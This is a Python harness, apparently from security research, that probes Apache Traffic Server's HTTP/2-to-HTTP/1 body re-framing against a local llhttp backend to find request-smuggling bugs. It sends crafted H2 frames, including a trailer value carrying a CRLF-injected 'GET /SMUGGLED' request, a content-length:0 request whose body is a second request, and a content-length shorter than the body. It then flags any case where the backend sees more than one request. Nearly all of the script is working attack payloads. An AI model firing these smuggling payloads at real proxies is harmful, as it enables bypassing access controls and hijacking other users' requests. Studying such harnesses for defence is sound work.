"""Hunt ATS's H2->H1 body re-framing against a real llhttp backend (chunk_bk.js). ATS has
a chunked-transfer CVE history, and the CL-only conn_bk could not see the chunked path.
Map how ATS frames a no-CL H2 body to H1 (CL vs chunked), then probe trailers, TE.CL, and
chunked-edge cases. A smuggle = the llhttp backend frames >1 request from one forwarded
stream, or a trailer/CL confusion crosses ATS into the backend. SENTINEL: benign body -> 1."""
import os
import sys
import time

sys.path.insert(0, "/home/j4kuuu/Desktop/tools/Phage/src")
from phage.evo import genome as G
from phage.evo.driver_h2 import send_h2

HOST, PORT = "127.0.0.1", 4440
LOG = "logs/chunk_bk.log"


def sz():
    try:
        return os.path.getsize(LOG)
    except OSError:
        return 0


def fire(genome, label):
    off = sz()
    cli, clean = send_h2(HOST, PORT, genome, timeout=5.0, sni="lab")
    time.sleep(0.5)
    try:
        with open(LOG, "rb") as f:
            f.seek(off)
            out = f.read()
    except OSError:
        out = b""
    reqs = [l for l in out.split(b"\n") if l.startswith(b"REQ ")]
    flag = "  <<< SMUGGLE" if len(reqs) > 1 else ""
    print(f"\n[{label}] resp={len(cli)}B backend_reqs={len(reqs)}{flag}")
    for r in reqs:
        print(f"  {r.decode('latin1')}")
    return len(reqs)


def hdr(fields, end):
    return G.Headers(tuple(fields), end_stream=end)


REQ = [(b":method", b"POST"), (b":scheme", b"https"), (b":authority", b"lab")]


if __name__ == "__main__":
    n = fire([hdr(REQ + [(b":path", b"/sentinel"), (b"content-length", b"5")], False),
              G.Data(b"HELLO", end_stream=True)], "SENTINEL CL:5 body")
    if n != 1:
        print(f"SENTINEL FAIL ({n}). Stop.")
        sys.exit(1)
    print("SENTINEL OK.")

    # reframe map: no-CL body -> does ATS emit CL or chunked to the backend?
    fire([hdr(REQ + [(b":path", b"/nocl")], False), G.Data(b"HELLO", end_stream=True)],
         "reframe: no-CL body (watch te= at backend)")
    fire([hdr(REQ + [(b":path", b"/stream")], False), G.Data(b"AAAA", end_stream=False),
          G.Data(b"BBBB", end_stream=True)], "reframe: no-CL multi-frame body")
    # trailers: does ATS forward H2 trailers as H1 chunked trailers?
    fire([hdr(REQ + [(b":path", b"/trailer")], False), G.Data(b"HI", end_stream=False),
          hdr([(b"x-trailer", b"present")], True)], "trailer benign")
    fire([hdr(REQ + [(b":path", b"/tr-crlf")], False), G.Data(b"HI", end_stream=False),
          hdr([(b"x-tr", b"a\r\nGET /SMUGGLED HTTP/1.1\r\nHost: lab\r\n\r\n")], True)],
         "trailer CRLF injection")
    # TE.CL: send a content-length AND force chunked (over-length body vs CL).
    fire([hdr(REQ + [(b":path", b"/te-cl"), (b"content-length", b"4")], False),
          G.Data(b"AAAAAAAA", end_stream=True)], "CL:4 with 8B body (CL<data)")
    # CL:0 with a body (does ATS forward CL:0 + body, or drop?).
    fire([hdr(REQ + [(b":path", b"/cl0"), (b"content-length", b"0")], False),
          G.Data(b"GET /SMUGGLED HTTP/1.1\r\nHost: lab\r\n\r\n", end_stream=True)],
         "CL:0 + smuggled body")
    print("\nVERDICT: any <<< SMUGGLE = llhttp framed >1 request; note te= on the no-CL rows.")
